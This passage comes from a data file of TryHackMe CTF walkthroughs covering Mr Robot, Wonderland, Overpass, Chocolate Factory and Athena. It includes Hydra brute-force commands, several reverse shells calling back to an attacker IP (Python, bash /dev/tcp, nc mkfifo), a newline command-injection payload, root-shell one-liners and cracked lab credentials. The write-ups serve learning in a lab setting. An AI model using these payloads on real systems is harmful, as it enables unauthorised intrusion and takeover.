    { type: "text", content: "With random credentials, the error message leaks useful info. If the site tells you whether the username is valid, you can split the job into two steps: find a real username first, then attack the password for only that user." },
    { type: "callout", content: "Pointer: When a login page returns different errors for “invalid username” vs “wrong password”, it’s basically telling you how to do username enumeration." },

    { type: "text", content: "Next I checked robots.txt, and it gave me two more paths to look at." },
    { type: "image", content: "Pasted image 20260222203527.png", alt: "robots.txt revealing additional paths" },
    { type: "text", content: "One of those paths led to key 1." },
    { type: "image", content: "Pasted image 20260222203552.png", alt: "Key 1 found" },

    { type: "text", content: "The other one was a big wordlist file:" },
    { type: "code", content: "/fsocity.dic" },
    { type: "image", content: "Pasted image 20260222203709.png", alt: "fsocity.dic contents preview" },
    { type: "text", content: "I checked the other directories I found, but most were either redirects, forbidden, or just unrelated content. So I used the wordlist for login enumeration." },
    { type: "callout", content: "Pointer: If a box hands you a wordlist, it usually wants you to use it. Don’t overcomplicate it." },

    { type: "heading", content: "4) Username spray" },
    { type: "text", content: "Before using Hydra, I downloaded the wordlist locally:" },
    { type: "code", content: "wget http://10.114.186.95/fsocity.dic" },
    { type: "image", content: "Pasted image 20260222204735.png", alt: "Downloading fsocity.dic" },

    { type: "text", content: "The list is huge (800k+). Username-spraying that as-is is painful, so I cleaned it up with uniq to remove duplicates first." },
    { type: "image", content: "Pasted image 20260222205008.png", alt: "Reducing wordlist with uniq" },
    { type: "callout", content: "Pointer: Always de-duplicate big lists before brute forcing. It saves a lot of time and noise." },

    { type: "text", content: "To build the Hydra command, I needed to see how the login form submits. So I opened the browser dev tools (Network tab), submitted a test login, and watched the request." },
    { type: "image", content: "Pasted image 20260222204543.png", alt: "Network tab showing POST parameters" },
    { type: "text", content: "It’s a POST request with two parameters (log and pwd), so I used http-post-form." },

    { type: "text", content: "Username spray (static password, testing usernames):" },
    { type: "code", content: "hydra -L wordlist -p test 10.114.186.95 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username\" -t 64 -I -v" },
    { type: "text", content: "Flags used (quick explanation):" },
    { type: "code", content: "-L  : username list\n-p  : static password\nhttp-post-form : tells hydra we are posting a login form\nF=  : failure string to detect invalid attempts\n-t  : threads\n-v  : verbose (mainly to see successes)\n-I  : don’t wait between retries / continue cleanly" },
    { type: "image", content: "Pasted image 20260222210427.png", alt: "Hydra finding a valid username" },
    { type: "text", content: "That gave me a valid username. Then I flipped it to password brute force with a static username:" },

    { type: "code", content: "hydra -l elliot -P wordlist 10.114.186.95 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect\" -t 64 -I -v" },
    { type: "image", content: "Pasted image 20260222211529.png", alt: "Hydra finding the password" },
    { type: "text", content: "Credentials found:" },
    { type: "code", content: "elliot:ER28-0652" },

    { type: "heading", content: "4.5) Hidden shortcut (optional)" },
    { type: "text", content: "You can actually skip most of the spraying. There’s a shortcut: visit the license page and scroll down  - it contains a Base64 blob that decodes to the same credentials." },
    { type: "image", content: "Pasted image 20260222211554.png", alt: "Base64 shown on license page" },
    { type: "code", content: "ZWxsaW90OkVSMjgtMDY1Mgo=" },
    { type: "image", content: "Pasted image 20260222211616.png", alt: "Decoded Base64 result" },

    
    { type: "heading", content: "5) Getting a reverse shell" },
    { type: "text", content: "After logging in as elliot, I checked if the account had admin rights." },
    { type: "image", content: "Pasted image 20260222211845.png", alt: "Logged in as elliot" },
    { type: "image", content: "Pasted image 20260222212343.png", alt: "Users tab showing admin privileges" },
    { type: "text", content: "It did. Since it’s WordPress admin, the easiest path is editing a theme PHP file and triggering it from the browser." },
    { type: "image", content: "Pasted image 20260222212504.png", alt: "Editing theme PHP file" },

    { type: "text", content: "I first did a quick echo test to make sure the PHP change executes, then visited the theme file directly:" },
    { type: "code", content: "http://10.114.186.95/wp-content/themes/Twenty+Fifteen/404.php" },
    { type: "image", content: "Pasted image 20260222212608.png", alt: "Echo test working in browser" },

    { type: "text", content: "After confirming it runs, I dropped in a reverse shell payload (I used the PHP pentestmonkey one from revshells) and caught the shell." },
    { type: "image", content: "Pasted image 20260222212752.png", alt: "Reverse shell payload used" },
    { type: "callout", content: "Note: My attacking machine got terminated around here, so my IP changed mid-way. Same steps, just different callback IP." },

    { type: "text", content: "Once the shell landed, I stabilized it:" },
    { type: "code", content: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },

    { type: "text", content: "Then I checked home directories." },
    { type: "image", content: "Pasted image 20260222215102.png", alt: "Checking /home and spotting robot user files" },
    { type: "text", content: "I couldn’t read key 2 yet, but I found credentials material for the robot user. The hash was MD5, so I cracked it with CrackStation." },
    { type: "image", content: "Pasted image 20260222215152.png", alt: "CrackStation cracking MD5" },
    { type: "text", content: "Robot creds:" },
    { type: "code", content: "robot:abcdefghijklmnopqrstuvwxyz" },

    { type: "text", content: "At this point I had two options: SSH in as robot, or just switch users from the current shell. I went with su." },
    { type: "image", content: "Pasted image 20260222215412.png", alt: "Switching to robot user" },
    { type: "text", content: "Then I grabbed key 2." },
    { type: "image", content: "Pasted image 20260222215444.png", alt: "Key 2 found" },
    { type: "callout", content: "Pointer: If you already have a shell, su is usually faster than SSH. SSH is nice if your shell is unstable, though." },

    { type: "heading", content: "6) Privilege escalation" },
    { type: "text", content: "The box was straightforward so far, so I tried manual enumeration first (and kept linpeas as a backup plan)." },
    { type: "text", content: "Quick checks:" },
    { type: "list", content: "", items: [
      "Checked cron (nothing useful)",
      "Checked environment variables (nothing interesting)",
      "Checked root processes (nothing useful)"
    ]},
    { type: "image", content: "Pasted image 20260222215737.png", alt: "Environment variables check" },

    { type: "text", content: "Then I searched for SUID binaries (root-owned executables that run with elevated privileges):" },
    { type: "code", content: "find / -perm -4000 -user root -exec ls -ld {} \\; 2> /dev/null" },
    { type: "image", content: "Pasted image 20260222220206.png", alt: "SUID binaries found" },

    { type: "text", content: "Most of the results were normal, but one stood out: nmap with SUID is not common at all." },
    { type: "callout", content: "Pointer: If you see an unusual SUID binary, check GTFOBins immediately. That’s usually the intended privesc path." },

    { type: "text", content: "GTFOBins shows how to abuse SUID nmap to get a root shell." },
    { type: "image", content: "Pasted image 20260222220301.png", alt: "GTFOBins search" },
    { type: "image", content: "Pasted image 20260222220406.png", alt: "GTFOBins nmap method" },
    { type: "image", content: "Pasted image 20260222220414.png", alt: "Root shell obtained / key 3" },

    { type: "text", content: "After abusing the SUID nmap method, I got root and grabbed key 3." },
  ],
},
 
"wonderland": {
  title: "Wonderland",
  meta: "TryHackMe • Linux • Medium",
  slug: "wonderland",
  baseImageUrl: "/labs/Tryhackme/Wonderland/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: [
      "Obtain the flag in user.txt",
      "Escalate your privileges, what is the flag in root.txt?"
    ]},

    { type: "heading", content: "1) Initial page" },
    { type: "image", content: "Pasted image 20260223145017.png", alt: "Blank landing page" },
    { type: "text", content: "The homepage is basically empty - no links, no forms, and nothing useful in the page source. When a web app looks like a dead end, the fastest move is to enumerate: scan the box, then fuzz for hidden paths." },

    { type: "heading", content: "2) nmap" },
    { type: "code", content: "nmap -T4 -p- -A -r  -v -sV -oN scan.nmap  10.112.169.205" },
    { type: "image", content: "Pasted image 20260223145302.png", alt: "Nmap results" },
    { type: "text", content: "`nmap` didn’t give me anything exciting to abuse directly, so I switched to web discovery with `ffuf`." },

    { type: "heading", content: "3) ffuf" },
    { type: "code", content: "ffuf -u 'http://10.112.169.205/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e html,.txt,.php -s" },
    { type: "text", content: "I instantly got a hit for a directory called `r`. That’s short, weird, and usually intentional - so I opened it." },
    { type: "image", content: "Pasted image 20260223145406.png", alt: "Browsing /r" },
    { type: "text", content: "Still nothing obvious, and the source didn’t help either. So I fuzzed one level deeper under `/r/`." },
    { type: "code", content: "ffuf -u 'http://10.112.169.205/r/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e html,.txt,.php -s" },
    { type: "text", content: "The results started spelling something familiar: `a`, then `b`… it looked like it was building the word `rabbit`. Instead of fuzzing forever, I just guessed the full path: `/r/a/b/b/i/t`." },
    { type: "image", content: "Pasted image 20260223145602.png", alt: "Rabbit path end page" },
    { type: "text", content: "That page itself wasn’t special, but like always - I checked the source. And this time it paid off: I found credentials." },
    { type: "code", content: "alice:HowDothTheLittleCrocodileImproveHisShiningTail" },
    { type: "text", content: "Next step is obvious: try SSH with the creds." },

    { type: "heading", content: "4) SSH" },
    { type: "image", content: "Pasted image 20260223145752.png", alt: "SSH access as alice" },
    { type: "text", content: "After logging in, the filesystem looked a bit confusing (permissions and files weren’t where I expected). So I did the classic check: see what users exist under `/home`." },
    { type: "code", content: "alice - Us\nhatter\nrabbit" },

    { type: "heading", content: "5) Getting into rabbit" },
    { type: "text", content: "This box clearly wants lateral movement first (alice → rabbit/hatter). So I checked if `alice` can run anything as another user via `sudo -l`. And yep - we can run a Python script as `rabbit`:" },
    { type: "code", content: "(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py" },
    { type: "text", content: "I opened the script expecting something sneaky, but it’s mostly just poetry. When you run it, it prints a random paragraph." },
    { type: "image", content: "Pasted image 20260223150209.png", alt: "Poem output" },
    { type: "text", content: "The interesting part is the import. It pulls in `random` - and that immediately hints at Python module hijacking." },
    { type: "image", content: "Pasted image 20260223150345.png", alt: "random import" },
    { type: "text", content: "Even though we can’t write to `/usr/lib/python3.6/random.py`, Python checks the current directory first. Since the script is in `/home/alice` (which we control), we can drop our own `random.py` there and it will get imported instead." },
    { type: "image", content: "Pasted image 20260223151906.png", alt: "Creating random.py hijack" },
    { type: "code", content: "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"192.168.141.103\",1234))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nimport pty\npty.spawn(\"bash\")" },
    { type: "image", content: "Pasted image 20260223152006.png", alt: "Reverse shell callback" },
    { type: "text", content: "Then I ran the sudo command again, caught the callback, and that dropped me into a shell as `rabbit`." },
    { type: "image", content: "Pasted image 20260223152119.png", alt: "Shell as rabbit" },

    { type: "heading", content: "6) Rabbit user" },
    { type: "text", content: "Now that we’re `rabbit`, the first thing is checking the home directory for anything custom or executable." },
    { type: "image", content: "Pasted image 20260223152228.png", alt: "Rabbit home directory" },
    { type: "text", content: "There’s an ELF binary called `teaParty`. That’s a big hint: reverse it and see what it calls / how it runs commands." },
    { type: "text", content: "I transferred it to my local machine with netcat:" },
    { type: "code", content: "Victim machine: nc 192.168.141.103 3333 < teaParty\nLocal machine: nc -lp 3333 > teaParty" },
    { type: "text", content: "Then I opened it in Ghidra." },
    { type: "image", content: "Pasted image 20260223134028.png", alt: "Ghidra view of teaParty" },
    { type: "text", content: "The core problem is simple: the program calls `date` using `$PATH` instead of the absolute path (`/bin/date`). So if we control PATH, we control what runs." },
    { type: "text", content: "Best place to do this is `/tmp` (writable and safe for quick hijacks). I couldn’t use `vim` or `nano` comfortably as `rabbit`, so I switched back to `alice`, created the fake `date` file in `/tmp` with a reverse shell, then came back to `rabbit` to trigger it." },
    { type: "text", content: "Here’s the setup before execution:" },
    { type: "image", content: "Pasted image 20260223135613.png", alt: "Fake date prepared in /tmp" },
    { type: "text", content: "Before running the binary, I made sure `/tmp` is first in PATH:" },
    { type: "code", content: "export PATH=\"/tmp:$PATH\"" },
    { type: "text", content: "Then I executed the binary and waited for the callback." },
    { type: "image", content: "Pasted image 20260223135750.png", alt: "Executing teaParty" },
    { type: "text", content: "And it worked - new shell landed." },
    { type: "image", content: "Pasted image 20260223135758.png", alt: "Shell obtained after PATH hijack" },

    { type: "heading", content: "7) Hatter" },
    { type: "image", content: "Pasted image 20260223135834.png", alt: "Hatter context" },
    { type: "text", content: "From here we grab the password for `hatter`:" },
    { type: "code", content: "WhyIsARavenLikeAWritingDesk?" },
    { type: "text", content: "I checked sudo permissions, but nothing useful showed up. Since we already have the password, a reverse shell is just extra pain - I switched to SSH for a clean terminal, then dropped `linpeas` for a fast privesc scan." },
    { type: "image", content: "Pasted image 20260223141145.png", alt: "linpeas results" },
    { type: "text", content: "Linpeas pointed to the escalation path, and GTFOBins confirms the move. Perl gives us a direct root shell:" },

    { type: "heading", content: "Using gtfobins" },
    { type: "code", content: "/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\"'" },
    { type: "image", content: "Pasted image 20260223141408.png", alt: "Root shell" },
    { type: "text", content: "And that’s it - we’re root, so we can read both flags." },
  ],
},

"overpass": {
  title: "Overpass",
  meta: "TryHackMe • Linux • Easy",
  slug: "overpass",
  baseImageUrl: "/labs/Tryhackme/Overpass/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: [
      "Hack the machine and get the flag in user.txt",
      "Escalate your privileges and get the flag in root.txt"
    ]},

    { type: "heading", content: "1) Initial page" },
    { type: "text", content: "The landing page is a simple password manager. Nothing looks immediately vulnerable… but that’s normal for this room - the real issues are usually hidden behind an admin path or weak client-side checks." },
    { type: "image", content: "Pasted image 20260223135705.png", alt: "Overpass landing page" },
    { type: "text", content: "A quick look at the source shows a “cipher” theme. The download page includes the password manager’s Go source, and it’s basically ROT47. Cool detail, but not the foothold - so I moved on to recon." },
    { type: "image", content: "Pasted image 20260223135800.png", alt: "Source hint / cipher reference" },

    { type: "heading", content: "2) Nmap" },
    { type: "code", content: "nmap -T4 -p- -A -r  -v -sV -oN scan.nmap  10.112.137.118" },
    { type: "image", content: "Pasted image 20260223140321.png", alt: "Nmap results" },
    { type: "text", content: "`nmap` didn’t hand me a direct exploit path, so I focused on web discovery - that’s where Overpass usually hides the real entry." },

    { type: "heading", content: "3) ffuf" },
    { type: "code", content: "ffuf -u 'http://10.112.137.118/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e html,.txt,.php -s" },
    { type: "image", content: "Pasted image 20260223140619.png", alt: "ffuf results showing /admin" },
    { type: "text", content: "The standout hit is `/admin`. When I opened it, it asked for credentials." },

    { type: "heading", content: "4) Login page" },
    { type: "image", content: "Pasted image 20260223140728.png", alt: "Admin login page" },
    { type: "text", content: "Instead of guessing passwords, I checked how the login is validated. This is where DevTools helps a lot: `F12` → Debugger tab → review the JavaScript." },
    { type: "image", content: "Pasted image 20260223140843.png", alt: "DevTools debugger view" },
    { type: "text", content: "The JS logic is basically doing “auth” on the client side using a cookie comparison - which is exactly the kind of mistake we love in CTFs." },
    { type: "code", content: "What it does in short.\nsends a \"POST\" request to \"/api/login\" Takes the value of the parameters \"username\" & \"password\" Then checks it against the cookie, If its == \"Incorrect credentials\", It declines our login, But funnily enough, Since it compares the cookie to the fixed value of \"Incorrect credentials\", We can just set our own cookie with anything other than that." },
    { type: "text", content: "So I forged the cookie: `F12 -> Storage -> Cookies -> Add new cookie` with name `SessionToken` and value `w` (anything that isn’t the blocked value works). Then refresh." },
    { type: "image", content: "Pasted image 20260223141420.png", alt: "Cookie bypass works" },
    { type: "text", content: "Now we’re in. The admin panel gives us an RSA SSH key and even tells us the username (`James`). That’s our clean access path." },

    { type: "heading", content: "5) SSH" },
    { type: "text", content: "Trying to login into the `SSH`" },
    { type: "image", content: "Pasted image 20260223141941.png", alt: "SSH prompts for passphrase" },
    { type: "text", content: "The key is passphrase-protected. The room hints you should crack it, so I converted it to a John hash and ran `rockyou`." },
    { type: "code", content: "ssh2john ssh.key > hash.hash\njohn hash.hash --wordlist=/usr/share/seclists/rockyou.txt" },

    { type: "heading", content: "And we get the `pass`" },
    { type: "image", content: "Pasted image 20260223142102.png", alt: "Passphrase cracked" },
    { type: "text", content: "With the passphrase, SSH works cleanly - then we grab `user.txt`." },
    { type: "image", content: "Pasted image 20260223142227.png", alt: "User flag captured" },

    { type: "heading", content: "6) Privilege Escalation" },
    { type: "text", content: "Now for root. First thing I checked is cron jobs (scheduled tasks). That’s where this room hides the privesc." },
    { type: "image", content: "Pasted image 20260223142500.png", alt: "Cron job runs buildscript as root" },
    { type: "text", content: "Root is curling `/downloads/src/buildscript.sh` and piping it into bash. That’s basically: “If you can control what gets downloaded, you get root.”" },
    { type: "text", content: "Opening the script in the browser shows what it normally does:" },
    { type: "code", content: "GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go\n## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go\n## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go\n## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go\n## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go\necho \"$(date -R) Builds completed\" >> /root/buildStatus" },
    { type: "text", content: "The content doesn’t matter much - the important part is that root executes it. So I checked if we can hijack hostname resolution by editing `/etc/hosts`." },
    { type: "image", content: "Pasted image 20260223142949.png", alt: "Writable /etc/hosts" },
    { type: "text", content: "We do have write access. That means we can point the script’s host to our own machine, serve a malicious `buildscript.sh` from the same directory path, and let cron do the rest." },
    { type: "text", content: "The setup is: start a local web server, recreate `downloads/src/buildscript.sh`, put a reverse shell in it, and listen for root to call back." },
    { type: "code", content: "python3 -m http.server [PORT]\n\nmkdir -p downloads/src/\nvim downloads/src/buildscript.sh\n\n #!/bin/bash                                                                     \n bash -c 'exec bash -i &>/dev/tcp/192.168.141.103/12345 <&1'\n \nSet up you nc listner on port 12345\nnc -lvnp 12345\nWait a minute\nYou get rev shell with root" },
    { type: "image", content: "Pasted image 20260223144442.png", alt: "Serving malicious buildscript" },
    { type: "image", content: "Pasted image 20260223144522.png", alt: "Root shell obtained" },
  ],
},

"chocolate-factory": {
  title: "Chocolate Factory",
  meta: "TryHackMe • Linux • Easy",
  slug: "chocolate-factory",
  baseImageUrl: "/labs/Tryhackme/ChocolateFactory/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: [
      "Enter the key you found!",
      "What is Charlie's password?",
      "change user to charlie",
      "Enter the user flag",
      "Enter the root flag"
    ]},

    { type: "heading", content: "1) Initial page" },
    { type: "image", content: "Pasted image 20260224134238.png", alt: "Login page" },
    { type: "text", content: "The homepage is just a login form. I checked the page source and saw it references `/validate.php`, but nothing there looked useful - it feels more like a decoy than a real lead." },
    { type: "image", content: "Pasted image 20260224134324.png", alt: "Source includes /validate.php" },
    { type: "text", content: "So instead of staring at the login page, I moved on to the two things that always uncover new doors: a full port scan and directory fuzzing." },

    { type: "heading", content: "2) nmap" },
    { type: "code", content: "nmap -T4 -p- -A -r  -v -sV -oN scan.nmap  10.114.184.235" },
    { type: "text", content: "The scan shows a surprising number of open ports (29). That’s unusual for an easy box, so I kept my eye out for anything that looks like file downloads or alternate services." },
    { type: "code", content: "Discovered open port 21/tcp on 10.114.184.235\nDiscovered open port 22/tcp on 10.114.184.235\nDiscovered open port 80/tcp on 10.114.184.235\nDiscovered open port 100/tcp on 10.114.184.235\nDiscovered open port 101/tcp on 10.114.184.235\nDiscovered open port 103/tcp on 10.114.184.235\nDiscovered open port 102/tcp on 10.114.184.235\nDiscovered open port 104/tcp on 10.114.184.235\nDiscovered open port 105/tcp on 10.114.184.235\nDiscovered open port 106/tcp on 10.114.184.235\nDiscovered open port 107/tcp on 10.114.184.235\nDiscovered open port 108/tcp on 10.114.184.235\nDiscovered open port 110/tcp on 10.114.184.235\nDiscovered open port 109/tcp on 10.114.184.235\nDiscovered open port 111/tcp on 10.114.184.235\nDiscovered open port 112/tcp on 10.114.184.235\nDiscovered open port 113/tcp on 10.114.184.235\nDiscovered open port 114/tcp on 10.114.184.235\nDiscovered open port 115/tcp on 10.114.184.235\nDiscovered open port 116/tcp on 10.114.184.235\nDiscovered open port 117/tcp on 10.114.184.235\nDiscovered open port 119/tcp on 10.114.184.235\nDiscovered open port 118/tcp on 10.114.184.235\nDiscovered open port 120/tcp on 10.114.184.235\nDiscovered open port 121/tcp on 10.114.184.235\nDiscovered open port 122/tcp on 10.114.184.235\nDiscovered open port 123/tcp on 10.114.184.235\nDiscovered open port 124/tcp on 10.114.184.235\nDiscovered open port 125/tcp on 10.114.184.235" },
    { type: "text", content: "Port `21` is FTP, so I already knew I’d try anonymous login. But after the scan finished, port `113` was the real standout." },
    { type: "image", content: "Pasted image 20260224135935.png", alt: "Nmap shows port 113" },
    { type: "text", content: "Visiting port `113` downloads an ELF binary." },
    { type: "image", content: "Pasted image 20260224140202.png", alt: "ELF download" },
    { type: "text", content: "The binary asks for a name. Before reversing it, I ran `strings` to see if anything obvious leaks out." },
    { type: "code", content: "strings key_rev_key" },
    { type: "image", content: "Pasted image 20260224140305.png", alt: "strings output contains the key" },
    { type: "text", content: "And that immediately gives us the key (Question 1):" },
    { type: "code", content: "b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='" },

    { type: "heading", content: "3) FTP" },
    { type: "text", content: "Since FTP is open, I tried anonymous access first." },
    { type: "code", content: "ftp 10.114.184.235" },
    { type: "image", content: "Pasted image 20260224134716.png", alt: "Anonymous FTP login" },
    { type: "text", content: "There’s an image file waiting there, so I downloaded it:" },
    { type: "code", content: "get gum_room.jpg" },
    { type: "image", content: "Pasted image 20260224134813.png", alt: "Downloading gum_room.jpg" },
    { type: "text", content: "With an image on a CTF box, stego is always worth a quick pass. I tested metadata, binwalk, and steghide." },
    { type: "list", content: "", items: [
      "Exiftool - Return nothing useful",
      "binwalk - return nothing useful",
      "steghide - return b64 file"
    ]},
    { type: "image", content: "Pasted image 20260224135106.png", alt: "steghide extraction" },
    { type: "code", content: "steghide extract -sf gum_room.jpg" },
    { type: "text", content: "Then decoded the extracted Base64 content:" },
    { type: "code", content: "gum_room.jpg | base64 -d" },
    { type: "text", content: "That gives us `/etc/shadow` contents, including Charlie’s hash - perfect for cracking." },
    { type: "code", content: "echo \"charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::\" > hash" },
    { type: "text", content: "Crack it with John:" },
    { type: "code", content: "john hash --wordlist=/usr/share/seclists/rockyou.txt" },
    { type: "text", content: "Or hashcat:" },
    { type: "code", content: "hashcat -m 1800 -a 0 hash /usr/share/seclists/rockyou.txt" },
    { type: "image", content: "Pasted image 20260224140459.png", alt: "Cracked password output" },
    { type: "text", content: "Password recovered (Question 2):" },
    { type: "code", content: "charlie:cn7824" },

    { type: "text", content: "I tried SSH with it, but it didn’t authenticate here." },
    { type: "heading", content: "SSH Doesn't connect us." },
    { type: "image", content: "Pasted image 20260224140628.png", alt: "SSH failure" },
    { type: "text", content: "No worries - creds still matter. Next place to try is the web login, since that often unlocks a hidden panel." },

    { type: "subheading", content: "3.5) Shortcut" },
    { type: "text", content: "If you want to move faster, just `ffuf` the site for pages. This challenge uses extensions everywhere, so include `-e .php,.html` and you’ll hit `/home.php` quickly." },
    { type: "image", content: "Pasted image 20260224141001.png", alt: "ffuf finds home.php" },
    { type: "code", content: "ffuf -u 'http://10.114.184.235/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -e html,.php -s" },

    { type: "heading", content: "4) Login page -> Rev shell" },
    { type: "text", content: "Using Charlie’s creds on the login page redirects us to `/home.php`, and that page contains a command execution interface - that’s our foothold." },
    { type: "image", content: "Pasted image 20260224141043.png", alt: "Command execution panel" },
    { type: "text", content: "From there it’s a standard reverse shell:" },
    { type: "code", content: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.141.103 1234>/tmp/f" },
    { type: "image", content: "Pasted image 20260224141246.png", alt: "Reverse shell obtained" },
    { type: "text", content: "Inside `/home/charlie`, `user.txt` exists but isn’t readable from this context. But there’s a file called `teleport` that we *can* read." },
    { type: "image", content: "Pasted image 20260224141620.png", alt: "teleport file" },
    { type: "text", content: "`teleport` is Charlie’s RSA private key - which is a clean, stable way to access the account properly." },
    { type: "text", content: "I copied it locally and fixed permissions so SSH accepts it." },
    { type: "image", content: "Pasted image 20260224141732.png", alt: "Using RSA key" },
    { type: "text", content: "After SSH’ing in as Charlie, I could finally read the user flag:" },
    { type: "code", content: "charlie@ip-10-114-184-235:/home/charlie$ cat user.txt\nflag{cd5509042371b34e4826e4838b522d2e}" },

    { type: "heading", content: "5) Privilege escalation" },
    { type: "text", content: "Now for root. First check: `sudo -l`. Charlie can run `vi` with sudo." },
    { type: "image", content: "Pasted image 20260224142023.png", alt: "sudo -l output" },
    { type: "text", content: "That’s a GTFOBins classic - spawn a root shell from `vi`:" },
    { type: "code", content: "vi -c ':!/bin/sh' /dev/null" },
    { type: "text", content: "Now we’re root. The last step is printing the final flag, which this room hides behind a broken decrypt script. The goal is simply to get it running so it outputs the decrypted message." },

    { type: "heading", content: "So the new fixed code is." },
    { type: "code", content: "#!/usr/bin/python3\nfrom cryptography.fernet import Fernet\nimport pyfiglet\nf = Fernet(b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=')\nencrypted_mess = b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ' dcrypt_mess = f.decrypt(encrypted_mess)\nmess = dcrypt_mess.decode()\nprint(mess)" },
    { type: "image", content: "Pasted image 20260224144331.png", alt: "Decrypted output" },
    { type: "text", content: "Running it prints the last flag and completes the room." },
  ],
},

"athena": {
  title: "Athena",
  meta: "TryHackMe • Linux • Medium",
  slug: "athena",
  baseImageUrl: "/labs/Tryhackme/Athena/",
  sections: [
    { type: "heading", content: "0) Questions:" },
    { type: "list", content: "", items: [
      "What is the user flag?",
      "What is the root flag?"
    ]},

    { type: "heading", content: "1) Initial page" },
    { type: "image", content: "Pasted image 20260224144753.png", alt: "Athena landing page" },
    { type: "text", content: "The web page doesn’t give anything away - no useful links, nothing interesting in the source. So I stopped wasting time on the UI and moved to host enumeration." },

    { type: "heading", content: "2) nmap" },
    { type: "code", content: "nmap -T4 -p- -A -r  -v -sV -oN scan.nmap  10.113.137.225" },
    { type: "image", content: "Pasted image 20260224145245.png", alt: "Nmap results showing SMB" },
    { type: "text", content: "Ports `139` and `445` are open, which screams SMB. In a lot of boxes, SMB is basically a public leak - shares often contain notes, configs, or a “hidden” web path." },

    { type: "heading", content: "3) SMB" },
    { type: "text", content: "First step is enumerating shares. I tried a null session to see what’s readable without creds." },
    { type: "code", content: "nxc smb netexec smb 10.113.137.225 -u '' -p '' --shares" },
    { type: "image", content: "Pasted image 20260224145709.png", alt: "SMB shares" },
    { type: "text", content: "We have a `public` share with read permissions (and `IPC$` is just default). So I connected with `smbclient`." },
    { type: "text", content: "We can check it using `smbclient`" },
    { type: "code", content: "smbclient //10.113.137.225/public" },
    { type: "text", content: "Inside the share, there’s `msg_for_administrator.txt`. I grabbed it using `get msg_for_administrator.txt`." },
    { type: "image", content: "Pasted image 20260224150153.png", alt: "Downloading the admin message" },
    { type: "code", content: "cat msg_for_administrator.txt \n\nDear Administrator,\n\nI would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel\n\nYours sincerely,\n\nAthena\nIntern" },
    { type: "text", content: "That message gives us the exact web path: `/myrouterpanel`. That’s the breadcrumb we needed." },

    { type: "heading", content: "4) Router panel" },
    { type: "image", content: "Pasted image 20260224150253.png", alt: "Router panel page" },
    { type: "text", content: "This page looks like a ping panel - which is often command injection bait. The other pages are under construction, so this is clearly the intended attack surface." },
    { type: "text", content: "I tried the usual separators like `&`, `|`, and `;` first, but they didn’t work." },
    { type: "image", content: "Pasted image 20260224150443.png", alt: "Blocked injection attempts" },
    { type: "text", content: "So I tried a bypass: `%0a` (newline). Some filters block separators but forget that a newline can still split commands. Using it changed the server response - which is a good sign." },
    { type: "image", content: "Pasted image 20260224150645.png", alt: "Different error with newline injection" },
    { type: "text", content: "To avoid browser encoding weirdness, I switched to Burp so I can control the request precisely." },
    { type: "image", content: "Pasted image 20260224150751.png", alt: "Burp request" },
    { type: "text", content: "At that point, the injection works - so the next move is turning it into a reverse shell." },
    { type: "text", content: "Now its time to get a rev-shell" },
    { type: "code", content: "ip=127.0.0.1%0anc -c sh 192.168.141.103 1234&submit=" },
    { type: "image", content: "Pasted image 20260224151121.png", alt: "Reverse shell triggered" },

    { type: "heading", content: "5) Getting into athena" },
    { type: "text", content: "Once I got a shell, I stabilized it and looked around. Nothing obvious popped immediately, so I uploaded `linpeas` to speed up local enumeration." },
    { type: "image", content: "Pasted image 20260224152815.png", alt: "linpeas output" },
    { type: "text", content: "Linpeas highlighted an odd file: `backup.sh` is owned by us and the user `athena`. That usually means it’s shared or executed by someone else - so it’s worth checking." },
    { type: "image", content: "Pasted image 20260224153027.png", alt: "backup.sh suspicious ownership" },
    { type: "text", content: "Next question: is it executed automatically? That’s where `pspy` helps - it shows background tasks without needing root." },
    { type: "image", content: "Pasted image 20260224153930.png", alt: "pspy output" },
    { type: "text", content: "pspy shows it’s being executed by UID `1001`." },
    { type: "text", content: "And its athena of whom is executing the file. So we can edit the file to have a rev-shell to athena." },
    { type: "code", content: "To stablize the shell more\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nCtrl+z\nstty raw -echo; fg\nIf it breaks do \"reset\"" },
    { type: "image", content: "Pasted image 20260224154622.png", alt: "Shell stabilization" },
